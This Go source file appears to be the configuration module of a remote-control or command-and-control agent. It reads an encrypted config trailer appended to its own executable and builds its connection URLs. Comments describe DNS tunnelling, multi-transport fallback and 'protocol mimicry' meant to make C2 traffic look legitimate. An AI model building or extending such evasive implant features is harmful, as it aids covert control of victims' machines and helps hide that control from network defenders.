package config

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"hash/crc32"
	"net/url"
	"os"
	"strings"
	"sync"
)

const (
	TrailerMagic       = "SPARKCFG"
	trailerVersion     = uint16(1)
	TrailerFooterSize  = 20
	ConfigBufferSize   = 384
	trailerReservedVal = uint16(0)
)

var (
	rawConfigOnce sync.Once
	rawConfig     []byte
	rawConfigErr  error
)

var Commit = ``

var Config struct {
	Secure bool   `json:"secure"`
	Host   string `json:"host"`
	Port   int    `json:"port"`
	Path   string `json:"path"`
	UUID   string `json:"uuid"`
	Key    string `json:"key"`

	// Transport fallback configuration
	EnableTransportFallback bool   `json:"enable_transport_fallback"` // Enable WS→WSS→QUIC→LongPoll→DNS fallback
	EnableQUIC              bool   `json:"enable_quic"`                // Enable QUIC transport
	QUICPort                int    `json:"quic_port"`                  // QUIC port (default: 443)
	DNSTunnelDomain         string `json:"dns_tunnel_domain"`          // Domain for DNS tunneling (e.g., "c2.example.com")
	DNSServer               string `json:"dns_server"`                 // DNS server for tunneling (default: "8.8.8.8:53")

	// Protocol mimicry (makes C2 traffic look legitimate)
	EnableMimicry bool `json:"enable_mimicry"` // Enable protocol mimicry
}

type trailerFooter struct {
	Magic    [8]byte
	Version  uint16
	Reserved uint16
	Length   uint32
	CRC32    uint32
}

func GetBaseURL(ws bool) string {
	baseUrl := url.URL{
		Host: fmt.Sprintf(`%v:%d`, Config.Host, Config.Port),
		Path: Config.Path,
	}
	if ws {
		if Config.Secure {
			baseUrl.Scheme = `wss`
		} else {
			baseUrl.Scheme = `ws`
		}
	} else {
		if Config.Secure {
			baseUrl.Scheme = `https`
		} else {
			baseUrl.Scheme = `http`
		}
	}
	base := baseUrl.String()
	if strings.HasSuffix(base, `/`) {
		base = strings.TrimSuffix(base, `/`)
	}
	return base
}

// RawConfig returns the encrypted configuration payload (length + buffer) from the trailer.
func RawConfig() ([]byte, error) {
	rawConfigOnce.Do(func() {
		rawConfig, rawConfigErr = readTrailer()
	})
	if rawConfigErr != nil {
		return nil, rawConfigErr
	}
	if len(rawConfig) == 0 {
		return nil, errors.New("config trailer empty")
	}
	return rawConfig, nil
}

// readTrailer loads the config data appended to the executable.
func readTrailer() ([]byte, error) {
	exePath, err := os.Executable()
	if err != nil {
		return nil, err
	}
	return readTrailerFromPath(exePath)
}

// readTrailerFromPath reads the trailer payload from the provided binary path.
func readTrailerFromPath(path string) ([]byte, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	stat, err := file.Stat()
	if err != nil {
		return nil, err
	}
	if stat.Size() < TrailerFooterSize {
		return nil, errors.New("config trailer missing")
	}
	footerOffset := stat.Size() - TrailerFooterSize
	buf := make([]byte, TrailerFooterSize)
	if _, err = file.ReadAt(buf, footerOffset); err != nil {
		return nil, err
	}
	var footer trailerFooter
	if err = binary.Read(bytes.NewReader(buf), binary.LittleEndian, &footer); err != nil {
		return nil, err
	}
	if string(footer.Magic[:]) != TrailerMagic {
		return nil, errors.New("config trailer magic mismatch")
	}
	if footer.Version != trailerVersion {
		return nil, errors.New("config trailer version mismatch")
	}
	length := int64(footer.Length)
	if length <= 0 || length > footerOffset {
		return nil, errors.New("config trailer length invalid")
	}
	data := make([]byte, length)
	if _, err = file.ReadAt(data, footerOffset-length); err != nil {
		return nil, err
	}
	if crc32.ChecksumIEEE(data) != footer.CRC32 {
		return nil, errors.New("config trailer checksum mismatch")
	}
	return data, nil
}

// BuildTrailerFooter serializes a footer for the provided payload.
func BuildTrailerFooter(data []byte) []byte {
	footer := trailerFooter{
		Version:  trailerVersion,
		Reserved: trailerReservedVal,
		Length:   uint32(len(data)),
		CRC32:    crc32.ChecksumIEEE(data),
	}
	copy(footer.Magic[:], []byte(TrailerMagic))

	buf := &bytes.Buffer{}
	binary.Write(buf, binary.LittleEndian, footer)
	return buf.Bytes()
}
